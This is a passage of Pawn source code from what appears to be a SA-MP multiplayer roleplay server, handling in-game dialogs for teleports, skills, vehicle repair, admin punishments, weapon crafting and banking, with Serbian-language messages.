                            case 1: 
                                time = 180;
                            case 2, 3, 4:
                                time = 60;
                            case 5:
                                time = 45;
                            case 6:
                                time = 30;
                        }
                        VIPPort[ playerid ] = time;
                        SendInfoMessage(playerid, "Sledeci port mozete koristiti za %d sekundi!", time);
                    }
                    if(PlayerInfo[playerid][xPromoter] >= 1) {

                        PromoterPort[ playerid ] = 180;
                        SendInfoMessage(playerid, "Sledeci port mozete koristiti za 180 sekundi!");
                    }

                    return 1;
                }
            }
        }
        return 1;
    }

    if(dialogid == dialog_portCreateVrsta && response) {

        odabranaPortVrsta[playerid] = listitem + 1;

        ShowPlayerDialog(playerid, dialog_portCreateIme, DIALOG_STYLE_INPUT, "Naziv Porta", "Unesite ime porta koji kreirate", "Odaberi", "Odustani");

        return 1;
    }

    if(dialogid == dialog_portCreateIme) {

        if(!response) return odabranaPortVrsta[playerid] = -1;
        if(response) {

            new portID = SledeciIDPort(MAX_PORTING);
            if(portID == -1) return SendErrorMessage(playerid, "Dostignut je maksimum kreiranih portova!");

            new imePorta[64];
            if(sscanf(inputtext, "s[64]", imePorta)) return ShowPlayerDialog(playerid, dialog_portCreateIme, DIALOG_STYLE_INPUT, "Naziv Porta", "Unesite ime porta koji kreirate", "Odaberi", "Odustani");

            new Float:Pos[3];
            GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);

            portInfo[portID][portPos][0] = Pos[0];
            portInfo[portID][portPos][1] = Pos[1];
            portInfo[portID][portPos][2] = Pos[2];
            portInfo[portID][portVrsta] = odabranaPortVrsta[playerid];

            strmid(portInfo[portID][portIme], imePorta, 0, strlen( imePorta ), 64 );

            SacuvajPort(portID);

            SendInfoMessage(playerid, "Port je uspesno kreiran!");

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_UpgradeSkill && response) {

        switch(listitem) {

            case 0: {

                if(PlayerInfo[playerid][xSkillPoen] < 2) return SendErrorMessage(playerid, "Za ovaj skill je potrebno 2 skill poena!");
                if(PlayerInfo[playerid][xSkillWorkAholic] == 5) return SendErrorMessage(playerid, "Ovaj skill je nadogradjen na maksimum!");

                PlayerInfo[playerid][xSkillWorkAholic]++;
                PlayerInfo[playerid][xSkillPoen]--;
                SavePlayer(playerid);

                SendInfoMessage(playerid, "Uspesno si unapredio WorkAholic skill! Trenutni nivo : %d", PlayerInfo[playerid][xSkillWorkAholic]);

                return 1;
            }

            case 1: {

                if(PlayerInfo[playerid][xSkillPoen] == 0) return SendErrorMessage(playerid, "Nemas skill poena!");
                if(PlayerInfo[playerid][xSkillDrive] == 5) return SendErrorMessage(playerid, "Ovaj skill je nadogradjen na maksimum!");

                PlayerInfo[playerid][xSkillDrive]++;
                PlayerInfo[playerid][xSkillPoen]--;
                SavePlayer(playerid);

                SendInfoMessage(playerid, "Uspesno si unapredio Drive skill! Trenutni nivo : %d", PlayerInfo[playerid][xSkillDrive]);

                return 1;
            }

            case 2: {

                if(PlayerInfo[playerid][xSkillPoen] == 0) return SendErrorMessage(playerid, "Nemas skill poena!");
                if(PlayerInfo[playerid][xSkillStamina] == 5) return SendErrorMessage(playerid, "Ovaj skill je nadogradjen na maksimum!");

                PlayerInfo[playerid][xSkillStamina]++;
                PlayerInfo[playerid][xSkillPoen]--;
                SavePlayer(playerid);

                PostaviStamina(playerid);
                checkRanacSlot(playerid);

                SendInfoMessage(playerid, "Uspesno si unapredio Stamina skill! Trenutni nivo : %d", PlayerInfo[playerid][xSkillStamina]);

                return 1;
            }
        }

        return 1;
    }

    if(dialogid == dialog_Mehanicar && response) {

        switch(listitem) {

            case 0: {

                if(!IsPlayerInAnyVehicle(playerid)) return SendErrorMessage(playerid, "Nisi u vozilu!");
                if(GetPlayerMoney(playerid) < 1000) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

                new veh = GetPlayerVehicleID(playerid);
                new Float:HP; GetVehicleHealth( veh, HP );
                if( HP > 950.0 ) return SendErrorMessage(playerid, "Ovom vozilu ne treba porpavka!");

                Novi_RepairVehicle( playerid, veh);
                Novi_SetVehicleHealth( veh, 1000.0 );
                antiCheatCS[ playerid ][ VehRepairTime ] = 3;
                vCanDrive[ veh ] = 1;

                DajIgracuNovac(playerid, -1000);
                SavePlayer(playerid);

                SendInfoMessage(playerid, "Uspesno si popravio vozilo za 1000$!");

                return 1;
            }
            case 1: {

                if(GetPlayerMoney(playerid) < 1500) return SendErrorMessage(playerid, "Nemas dovoljno novca!");

                if(PlayerInfo[playerid][xRepairKit] >= 5) return SendErrorMessage(playerid, "Imas maksimanalan broj repair kitova ( 5 )!");

                PlayerInfo[playerid][xRepairKit]++;
                SavePlayer(playerid);

                DajIgracuNovac(playerid, -1500);

                SendInfoMessage(playerid, "Uspesno si kupio repair kit za 1500$! Sada imas : %d", PlayerInfo[playerid][xRepairKit]);

                return 1;
            }
        }

        return 1;
    }

    if(dialogid == dialog_SahteOdabir) {

        if(!response) return 0;
        if(response) {

            switch(listitem) {

                case 0: {

                    UBanci[playerid] = false;
                    SetPlayerPos(playerid, RandomSahte[0][0], RandomSahte[0][1], RandomSahte[0][2]);
                    SetPlayerInterior(playerid, 0);
                    SetPlayerVirtualWorld(playerid, 0);
                    return 1;
                }
                case 1: {

                    UBanci[playerid] = false;
                    SetPlayerPos(playerid, RandomSahte[1][0], RandomSahte[1][1], RandomSahte[1][2]);
                    SetPlayerInterior(playerid, 0);
                    SetPlayerVirtualWorld(playerid, 0);
                    
                    return 1;
                }
                case 2: {
                    
                    UBanci[playerid] = false;
                    SetPlayerPos(playerid, RandomSahte[2][0], RandomSahte[2][1], RandomSahte[2][2]);
                    SetPlayerInterior(playerid, 0);
                    SetPlayerVirtualWorld(playerid, 0);
                    
                    return 1;
                }
                case 3: {

                    UBanci[playerid] = false;
                    SetPlayerPos(playerid, RandomSahte[3][0], RandomSahte[3][1], RandomSahte[3][2]);
                    SetPlayerInterior(playerid, 0);
                    SetPlayerVirtualWorld(playerid, 0);
                    
                    return 1;
                }
                case 4: {
            
                    UBanci[playerid] = false;
                    SetPlayerPos(playerid, RandomSahte[4][0], RandomSahte[4][1], RandomSahte[4][2]);
                    SetPlayerInterior(playerid, 0);
                    SetPlayerVirtualWorld(playerid, 0);
                    
                    return 1;
                }
                case 5: {
                    
                    UBanci[playerid] = false;
                    SetPlayerPos(playerid, RandomSahte[5][0], RandomSahte[5][1], RandomSahte[5][2]);
                    SetPlayerInterior(playerid, 0);
                    SetPlayerVirtualWorld(playerid, 0);
                    
                    return 1;
                }
            }
        }

        return 1;
    }

    if(dialogid == dialog_VPVeh) {

        if(!response) return 0;
        if(response) {

            if( VPVeh[ playerid ] == -1 ) {
               
                new idv;
                if(listitem == 0) { idv = 411; }
                if(listitem == 1) { idv = 522; }
                if(listitem == 2) { idv = 560; }
                if(listitem == 3) { idv = 579; }
                if(listitem == 4) { idv = 415; }
                if(listitem == 5) { idv = 451; }
                if(listitem == 6) { idv = 490; }
                if(listitem == 7) { idv = 495; }

                new Float:Poz[ 3 ];
                GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
                Novi_DestroyVehicle(VPVeh[playerid]);
                VPVeh[ playerid ] = V01D_CreateVehicle(idv, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, VPVeh[playerid], 0);
                
                SendInfoMessage( playerid, "Vozilo ID: %d je stvoreno.", VPVeh[ playerid ] );


                // if(KreiranAutoSalon[ playerid ] == -1) {
                //     new string[32];
                //     format(string, sizeof(string), "[ V/P %s ]", ImeIgraca(playerid));
                //     // VPLabel[playerid] = CreateDynamic3DTextLabel(string, SRVBOJA1,  Poz[ 0 ], Poz[ 1 ], Poz[ 2 ]+1.0, 20.0, INVALID_PLAYER_ID, VPVeh[ playerid ], 0, -1, -1, -1, 20.0, -1, 0);
                // }

            }
            else if( VPVeh[ playerid ] != -1 ) {
                SendInfoMessage( playerid, "Vozilo ID: %d je unisteno.", VPVeh[ playerid ] );
                Novi_DestroyVehicle( VPVeh[ playerid ] );
                // DestroyDynamic3DTextLabel(VPLabel[playerid]);
                VPVeh[ playerid ] = -1;
            }
            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_HVeh) {

        if(!response) return 0;
        if(response) {

            if( helperVeh[ playerid ] == -1 ) {
               
                new idv;
                if(listitem == 0) { idv = 411; }
                if(listitem == 1) { idv = 522; }
                if(listitem == 2) { idv = 560; }
                if(listitem == 3) { idv = 579; }
                if(listitem == 4) { idv = 415; }
                if(listitem == 5) { idv = 451; }
                if(listitem == 6) { idv = 490; }
                if(listitem == 7) { idv = 495; }

                new Float:Poz[ 3 ];
                GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
                Novi_DestroyVehicle(helperVeh[playerid]);
                helperVeh[ playerid ] = V01D_CreateVehicle(idv, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, helperVeh[playerid], 0);
                
                SendInfoMessage( playerid, "Vozilo ID: %d je stvoreno.", helperVeh[ playerid ] );


                // if(KreiranAutoSalon[ playerid ] == -1) {
                //     new string[32];
                //     format(string, sizeof(string), "[ Helper %s ]", ImeIgraca(playerid));
                //     helperLabel[playerid] = CreateDynamic3DTextLabel(string, SRVBOJA1,  Poz[ 0 ], Poz[ 1 ], Poz[ 2 ]+1.0, 20.0, INVALID_PLAYER_ID, helperVeh[ playerid ], 0, -1, -1, -1, 20.0, -1, 0);
                // }

            }
            else if( helperVeh[ playerid ] != -1 ) {
                SendInfoMessage( playerid, "Vozilo ID: %d je unisteno.", helperVeh[ playerid ] );
                Novi_DestroyVehicle( helperVeh[ playerid ] );
                // DestroyDynamic3DTextLabel(helperLabel[playerid]);
                helperVeh[ playerid ] = -1;
            }
            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_AVeh) {

        if(!response) return 0;
        if(response) {

            if( AdminVozilo[ playerid ] == -1 ) {
               
                new idv;
                if(listitem == 0) { idv = 411; }
                if(listitem == 1) { idv = 522; }
                if(listitem == 2) { idv = 560; }
                if(listitem == 3) { idv = 579; }
                if(listitem == 4) { idv = 415; }
                if(listitem == 5) { idv = 451; }
                if(listitem == 6) { idv = 490; }
                if(listitem == 7) { idv = 495; }

                new Float:Poz[ 3 ];
                GetPlayerPos( playerid, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ] );
                Novi_DestroyVehicle(AdminVozilo[playerid]);
                AdminVozilo[ playerid ] = V01D_CreateVehicle(idv, Poz[ 0 ], Poz[ 1 ], Poz[ 2 ], 0.0, 0, 0, -1 );
                Novi_PutPlayerInVehicle(playerid, AdminVozilo[playerid], 0);
                
                SendInfoMessage( playerid, "Vozilo ID: %d je stvoreno.", AdminVozilo[ playerid ] );


                // if(KreiranAutoSalon[ playerid ] == -1) {
                //     new string[32];
                //     format(string, sizeof(string), "[ A/H %s ]", ImeIgraca(playerid));
                //     AdminVehLabel[playerid] = CreateDynamic3DTextLabel(string, SRVBOJA1,  Poz[ 0 ], Poz[ 1 ], Poz[ 2 ]+1.0, 20.0, INVALID_PLAYER_ID, AdminVozilo[ playerid ], 0, -1, -1, -1, 20.0, -1, 0);
                // }

            }
            else if( AdminVozilo[ playerid ] != -1 ) {
                SendInfoMessage( playerid, "Vozilo ID: %d je unisteno.", AdminVozilo[ playerid ] );
                Novi_DestroyVehicle( AdminVozilo[ playerid ] );
                // DestroyDynamic3DTextLabel(AdminVehLabel[playerid]);
                AdminVozilo[ playerid ] = -1;
            }
            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_KazniID && response) {

        new id;
        if(sscanf(inputtext, "u", id)) return ShowPlayerDialog(playerid, dialog_KazniID, DIALOG_STYLE_INPUT, "Kazni Igraca", "Unesite ID igraca kojeg zelite kazniti", "Potvrdi", "Odustani");
        if( id == IPI ) return ShowPlayerDialog(playerid, dialog_KazniID, DIALOG_STYLE_INPUT, "Kazni Igraca", "Pogresan ID igraca\n\nUnesite ID igraca kojeg zelite kazniti", "Potvrdi", "Odustani");
        if( playerid == id ) return ShowPlayerDialog(playerid, dialog_KazniID, DIALOG_STYLE_INPUT, "Kazni Igraca", "Ne mozes sam sebi dati kaznu\n\nUnesite ID igraca kojeg zelite kazniti", "Potvrdi", "Odustani");
        if( PlayerInfo[ playerid ][ xAdmin ] < 6 && PlayerInfo[ id ][ xAdmin ] >= 1 ) return ShowPlayerDialog(playerid, dialog_KazniID, DIALOG_STYLE_INPUT, "Kazni Igraca", "Ne mozes zatvoriti clana Admin Team-a\n\nUnesite ID igraca kojeg zelite kazniti", "Potvrdi", "Odustani");

        if(PlayerInfo[id][xZatvor] != 0) return ShowPlayerDialog(playerid, dialog_KazniID, DIALOG_STYLE_INPUT, "Kazni Igraca", "Ovaj igrac je vec kaznjen\n\nUnesite ID igraca kojeg zelite kazniti", "Potvrdi", "Odustani");
        if( PlayerInfo[ id ][ xUbijen ] == 1 ) return ShowPlayerDialog(playerid, dialog_KazniID, DIALOG_STYLE_INPUT, "Kazni Igraca", "Sacekajte igrac se leci\n\nUnesite ID igraca kojeg zelite kazniti", "Potvrdi", "Odustani");

        KaznaIgraca[playerid] = id;

        ShowPlayerDialog(playerid, dialog_Kazni, DIALOG_STYLE_LIST, "Odaberi Kaznu", "DM\nPG\nDB\nTK\nSK\nLTA\nVredjanje 1\nVredjanje 2\nNacionalizam\nOglas\nVipAbuse/PromoterAbuse\nReklamiranje\nBA\nCheat", "Potvrdi", "Odustani");

        return 1;
    }

    if(dialogid == dialog_Kazni) {

        if(!response) return KaznaIgraca[playerid] = -1;

        else {

            new id = KaznaIgraca[playerid];

            if(listitem == 0) return KazniIgraca(playerid, id, "DeathMatch", 120, 50000);
            else if(listitem == 1) return KazniIgraca(playerid, id, "PowerGaming", 60, 10000);
            else if(listitem == 2) return KazniIgraca(playerid, id, "DriveBy", 60, 50000);
            else if(listitem == 3) return KazniIgraca(playerid, id, "TeamKill", 60, 50000);
            else if(listitem == 4) return KazniIgraca(playerid, id, "SpawnKill", 60, 50000);
            else if(listitem == 5) return KazniIgraca(playerid, id, "LTA", 120, 50000);
            else if(listitem == 6) return KazniIgraca(playerid, id, "Lakse Vredjanje", 30, 5000);
            else if(listitem == 7) return KazniIgraca(playerid, id, "Teze Vredjanje", 60, 50000);
            else if(listitem == 8) return KazniIgraca(playerid, id, "Nacionalizam", 180, 100000);
            else if(listitem == 9) return KazniIgraca(playerid, id, "Inv/AD", 15, 5000);
            else if(listitem == 10) return KazniIgraca(playerid, id, "Abuse Pozicije", 240, 150000);
            else if(listitem == 11) return KazniIgraca(playerid, id, "Reklamiranje", 15, 5000);
            else if(listitem == 12) return KazniIgraca(playerid, id, "Bug Abuse", 240, 150000);
            else if(listitem == 13) return KazniIgraca(playerid, id, "Cheat", 3000, 300000);

            return 1;
        }
    }

    if(dialogid == dialog_AutoPilot && response) {

        new place = listitem;

        if( GetPlayerInterior( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru." );
        if( GetPlayerVirtualWorld( playerid ) != 0 ) return SendErrorMessage( playerid, "Ne mozete koristiti u interijeru/vwu." );
        if( PlayerInfo[ playerid ][ xWanted ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete to dok imate wanted.");
        if( PlayerInfo[ playerid ][ xZatvor ] >= 1 ) return SendErrorMessage( playerid, "Ne mozete to dok ste u zatvoru / Area51.");

        if(vCanDrive[GetPlayerVehicleID(playerid)] == 0) return SendErrorMessage( playerid, "Ovo vozilo je unisteno i ne moze se pokrenuti.");

        new start = NearestPlayerNode(playerid,15.0);
        if(start == -1) return SendErrorMessage(playerid, "Satelit ne moze da vas pronadje! Probajte sa drugog mesta!");

        CalculatePath(start,NearestNodeFromPoint(places[place][pilotX],places[place][pilotY],places[place][pilotZ]),playerid);
        SendInfoMessage(playerid, "Pricekajte dok autopilot odabere najbolju rutu za Vas....");

        return 1;
    }

    if(dialogid == dialog_NargilaRent && response) {

        for(new i; i < sizeof(NargilaInfo); i++) {

            if(IsPlayerInRangeOfPoint(playerid, 3.0, NargilaInfo[ i ][ nargilaPosX ], NargilaInfo[ i ][ nargilaPosY ], NargilaInfo[ i ][ nargilaPosZ ])) {

                if(strval(inputtext) < 1 || strval(inputtext) > 5) return ShowPlayerDialog(playerid, dialog_NargilaRent, DIALOG_STYLE_INPUT, "NARGILA","Upisite vreme iznamljivanja nargile.\nNajmanje - 1 minut, najvise - 5 minuta.","U redu","Odustani");
                if(NargiluIznajmio[ playerid ] != 0) return SendClientMessage(playerid, -1, "Vec ste iznajmili nargilu ( /nargilaoff )");
                if(NargilaInfo[ i ][ IznajmioNargilu ] != playerid && NargilaInfo[ i ][ IznamljenaNargila ] == true) return SendClientMessage(playerid, -1, "Ta nargila je vec iznamljena.");
                NargilaInfo[ i ][ IznajmioNargilu ] = playerid;
                NargilaInfo[ i ][ IznamljenaNargila ] = true;
                NargiluIznajmio[ playerid ] = i;
                new str[ 40 ], pname[ MAX_PLAYER_NAME ];
                GetPlayerName(playerid, pname, sizeof(pname));
                format(str, sizeof(str), "Nargila iznamljena od\n%s", pname);
                Update3DTextLabelText(NargilaLabel[ i ], 0xFFFFFFFF, str);
                SendClientMessage(playerid, -1, "Pritisnite Y za pusenje.");
                NargilaTimer[ playerid ] = SetTimerEx("UnrentNargila", 60000*strval(inputtext), false, "i", playerid);
            }
        }

        return 1;
    }

    if(dialogid == dialog_MakeGun) {

        if(!response) return 1;
        if(response) {

            switch(listitem) {

                case 0: {

                    if(PlayerInfo[playerid][xMaterijali] < 300) return SendErrorMessage(playerid, "Nemas dovoljno materijala!");

                    GiveWeaponToPlayer(playerid, 24, 60);
                    PlayerInfo[playerid][xMaterijali] -= 300;
                    SavePlayer(playerid);

                    SendInfoMessage(playerid, "Uspesno si napravio oruzije!");

                    return 1;
                }

                case 1: {

                    if(PlayerInfo[playerid][xMaterijali] < 350) return SendErrorMessage(playerid, "Nemas dovoljno materijala!");

                    GiveWeaponToPlayer(playerid, 31, 130);
                    PlayerInfo[playerid][xMaterijali] -= 350;
                    SavePlayer(playerid);

                    SendInfoMessage(playerid, "Uspesno si napravio oruzije!");

                    return 1;
                }

                case 2: {

                    if(PlayerInfo[playerid][xMaterijali] < 300) return SendErrorMessage(playerid, "Nemas dovoljno materijala!");

                    GiveWeaponToPlayer(playerid, 30, 130);
                    PlayerInfo[playerid][xMaterijali] -= 300;
                    SavePlayer(playerid);

                    SendInfoMessage(playerid, "Uspesno si napravio oruzije!");

                    return 1;
                }

                case 3: {

                    if(PlayerInfo[playerid][xMaterijali] < 900) return SendErrorMessage(playerid, "Nemas dovoljno materijala!");

                    GiveWeaponToPlayer(playerid, 34, 20);
                    PlayerInfo[playerid][xMaterijali] -= 900;
                    SavePlayer(playerid);

                    SendInfoMessage(playerid, "Uspesno si napravio oruzije!");

                    return 1;
                }

                case 4: {

                    if(PlayerInfo[playerid][xMaterijali] < 100) return SendErrorMessage(playerid, "Nemas dovoljno materijala!");

                    GiveWeaponToPlayer(playerid, 25, 30);
                    PlayerInfo[playerid][xMaterijali] -= 100;
                    SavePlayer(playerid);

                    SendInfoMessage(playerid, "Uspesno si napravio oruzije!");

                    return 1;
                }

                case 5: {

                    if(PlayerInfo[playerid][xMaterijali] < 150) return SendErrorMessage(playerid, "Nemas dovoljno materijala!");

                    GiveWeaponToPlayer(playerid, 28, 120);
                    PlayerInfo[playerid][xMaterijali] -= 150;
                    SavePlayer(playerid);

                    SendInfoMessage(playerid, "Uspesno si napravio oruzije!");

                    return 1;
                }

                case 6: {

                    if(PlayerInfo[playerid][xMaterijali] < 200) return SendErrorMessage(playerid, "Nemas dovoljno materijala!");

                    GiveWeaponToPlayer(playerid, 29, 120);
                    PlayerInfo[playerid][xMaterijali] -= 200;
                    SavePlayer(playerid);

                    SendInfoMessage(playerid, "Uspesno si napravio oruzije!");

                    return 1;
                }

            }

            return 1;
        }

        return 1;
    }

    // if(dialogid == dialog_Achivements1) {

    //     if(!response) return 0;
    //     if(response) {

    //         new MisijeDialog[4096];
    //         strcat( MisijeDialog, ""SRVBOJA1SCM"__________________________Achivements__________________________\n\n");

    //         new string[128], done[32];
            
    //         if(PlayerInfo[playerid][xAchivements][7] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s    | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[7], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][8] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s  | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[8], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][9] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s             | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[9], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][10] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s           | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[10], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][11] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s    | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[11], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][12] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s  | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[12], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][13] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s   | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[13], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][14] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s  | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[14], done);
    //         strcat( MisijeDialog, string);

    //         ShowPlayerDialog(playerid, dialog_Achivements2, DIALOG_STYLE_MSGBOX, "Achivements", MisijeDialog, "Previous", "Exit");

    //         return 1;
    //     }
    // }

    // if(dialogid == dialog_Achivements2) {

    //     if(!response) return 0;
    //     if(response) {

    //         new MisijeDialog[4096];
    //         strcat( MisijeDialog, ""SRVBOJA1SCM"__________________________Achivements__________________________\n\n");

    //         new string[128], done[32];

    //         if(PlayerInfo[playerid][xAchivements][0] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s       | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[0], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][1] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[1], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][2] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[2], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][3] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[3], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][4] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s          | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[4], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][5] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s             | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[5], done);
    //         strcat( MisijeDialog, string);

    //         if(PlayerInfo[playerid][xAchivements][6] == 0) done = "{fe0202}Aktivno";
    //         else done = "{00d904}Zavrseno"; 
    //         format(string, sizeof(string), ""SRVBOJA1SCM"%s           | %s"SRVBOJA1SCM" | Nagrada: 1 Nesto\n", AchivementList[6], done);
    //         strcat( MisijeDialog, string);


    //         SPD(playerid, dialog_Achivements1, DIALOG_STYLE_MSGBOX, "Achivements", MisijeDialog, "Next", "Exit");

    //         return 1;
    //     }
    // }

    if(dialogid == dialog_Withdraw) {

        if(!response) return SelectTextDraw(playerid, SRVBOJA1);
        if(response) {

            SelectTextDraw(playerid, SRVBOJA1);

            if( !PlayerInfo[ playerid ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Prvo moras da otvoris racun u banci." );
            new cashdeposit,
                string[ 64 ];

            if( sscanf( inputtext, "i", cashdeposit ) ) return ShowPlayerDialog(playerid, dialog_Withdraw, DIALOG_STYLE_INPUT, "Withdraw", "Unesite sumu novca koju podizete", "Potvrdi", "Odustani");
            if( cashdeposit > PlayerInfo[ playerid ][ xBRacun ] || cashdeposit < 1 ) return SendErrorMessage( playerid, "Nemate toliko novaca !");
            DajIgracuNovacSpeech( playerid, cashdeposit );
            PlayerInfo[ playerid ][ xBRacun ] -= cashdeposit ;
            format( string, sizeof( string ), "Podigli ste $%d s vaseg racuna Ukupno: $%d ", cashdeposit, PlayerInfo[ playerid ][ xBRacun ] );
            SCM( playerid, ZUTA, string ); UpdateBankTD( playerid );
            SavePlayer( playerid );

            updateBankState(playerid);

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_Deposit) {

        if(!response) return SelectTextDraw(playerid, SRVBOJA1);
        if(response) {

            SelectTextDraw(playerid, SRVBOJA1);

            if( !PlayerInfo[ playerid ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Prvo moras da otvoris racun u banci." );
            new cashdeposit, curfunds = PlayerInfo[ playerid ][ xBRacun ];
            if( sscanf( inputtext, "i", cashdeposit ) ) return ShowPlayerDialog(playerid, dialog_Deposit, DIALOG_STYLE_INPUT, "Deposit", "Unesite sumu novca koju ostavljate", "Potvrdi", "Odustani");
            if( cashdeposit > PlayerInfo[ playerid ][ xNovac ] || cashdeposit < 1) return SendErrorMessage( playerid, "Nemate toliko novaca");

            DajIgracuNovacSpeech( playerid, -cashdeposit );
            PlayerInfo[ playerid ][ xBRacun ] += cashdeposit;
            SCM(playerid, BELA, "|___ BANKOVNI RACUN ___|");
            format( globalstring, sizeof( globalstring ), "  Stari iznos: $%d", curfunds);
            SCM( playerid, SIVA, globalstring );
            format( globalstring, sizeof( globalstring ), "  Pohrana: $%d",cashdeposit);
            SCM( playerid, SIVA, globalstring );
            SCM( playerid, SIVA, "|-----------------------------------------|");
            format( globalstring, sizeof( globalstring ), "  Novi iznos: $%d", PlayerInfo[ playerid ][ xBRacun ] );
            SCM( playerid, BELA, globalstring );
            UpdateBankTD( playerid );
            SavePlayer( playerid );

            updateBankState(playerid);

            return 1;
        }

        return 1;
    }

    if(dialogid == dialog_Transfer) {

        if(!response) return SelectTextDraw(playerid, SRVBOJA1);
        if(response) {

            SelectTextDraw(playerid, SRVBOJA1);

            if( !PlayerInfo[ playerid ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Prvo moras da otvoris racun u banci." );
            new id, cashdeposit;
            if( sscanf( inputtext, "iu", cashdeposit, id ) ) return ShowPlayerDialog(playerid, dialog_Transfer, DIALOG_STYLE_INPUT, "Transfer", "Unesite sumu novca koju saljete i ID igraca", "Potvrdi", "Odustani");
            if( cashdeposit > PlayerInfo[ playerid ][ xBRacun ] || cashdeposit < 1 ) return SendErrorMessage( playerid, "Nemate toliko novaca");
            if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID igraca." );
            if( !PlayerInfo[ id ][ xImaBRacun ] ) return SendErrorMessage( playerid, "Igrac nema racun u banci." );
            if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+." );
            if( PlayerInfo[ id ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Igrac mora biti level 5+." );
            if( cashdeposit > 500000 ) return SendErrorMessage( playerid, "Svota novca ne sme ici preko 500.000$." );
            
            PlayerInfo[ playerid ][ xBRacun ] -= cashdeposit;
            PlayerInfo[ id ][ xBRacun ] += cashdeposit;
            SavePlayer( playerid ); SavePlayer( id );
            PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);
            
            SendClientMessageEx( playerid, SIVA, "Prebacio si sa svoga racuna %d$ na %s-ov racun", cashdeposit, ImeIgraca( id ), id );
